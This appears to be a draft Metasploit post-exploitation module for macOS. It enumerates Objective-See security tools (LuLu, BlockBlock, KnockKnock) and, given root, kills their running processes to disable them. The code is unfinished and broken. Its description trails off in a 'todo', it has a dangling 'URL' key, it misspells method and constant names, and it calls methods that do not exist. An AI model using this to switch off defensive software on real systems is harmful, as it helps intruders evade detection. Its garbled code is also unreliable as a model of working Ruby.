##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::OSX 
  include Msf::Post::Process 

  def initialize(info = {})
    super(
      update_info(
        info,
        'Objective See Killer' => 'OSX Manage Module: Enumerate and disable Objective See products',
        'Description' => %q{
          This module enumerates the system for the presence of Objective See products such as LuLu.
          If these products are detected this module will also be able to disable those products by....todo fill in how it works
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'gardnerapp' ],
        'Platform' => [  'osx' ],
        'URL'
        'SessionTypes' => [ 'meterpreter', 'shell' ]
      )

  )
    register_options [
      OptBool.new('DISABLE', [true, 'When set to true this module will disable all installed ObjectiveSee products by sending a kill signal to the associated ppid.', false] )
    ]
  end

  # Holds information on an objective see product. i.e name, installation status user perms, group perms, owner, and location on filesystem.
  class ObjectiveSee

    # Arrays of products present on system & pid's of running processes
    %w[present pids].each {|var| eval("@@#{var} = []", binding, __FILE__,__LINE__)}
   
    def initalize(name)
      @name = name
      @path = "/Applications/#{name}"
      @installed = is_installed?
      @@present << self if is_installed?
    end 

    # define accessor methods
   %w[name path].each do |method|
    define_method "#{method}" do
      eval("@#{method}", binding, __FILE__, __LINE__)
    end 
   end 

   def is_installed?
    @installed = is_dir?(@path)
   end 

   def pid
    # may return more than one pid need to test
    @pid = pidof @name
    print_status "DEBUG @pid = #{@pid.inspect} for @name = #{@nam}"
   end 

   def running?
    true unless @pid.nil?
   end 

   class << self
     %w[present pids].each do |method|
      define_method method do
        eval "@@#{method}", binding, __FILE__, __LINE__
      end 
     end 
  end 

  # determine which products are installed and their ppid if any
  def enumerate
  	products = ["BlockBlock Helper.app", "KnockKnock.app", "LuLu.app"].map {|prod| ObjectiveSee.new prod}

    # we only want the products installed on the system
    products = products.filter_map {|product| product.installed? }
    products.each {|prod| print_status "#{prod.name} is installed."}

    # determine which products are running. 
    running = products.filter_map {|product| product.running? }
  end

  def disable
    unless is_root? fail_with(Failure::NoAcces, "Can not disable products unless running as root. Please escelate privlleges before re-running the module.")

    ObjectiveSee.running.each {|prod| kill_process prod.pid }
  end 

  def disable_mode?
    datastore['DISABLE']
  end

  def exploit
  	print_status("Enumerating Objective See security products.")
  	running = enumerate

    if disable_mode?
      disable_products
    end 
  end

end
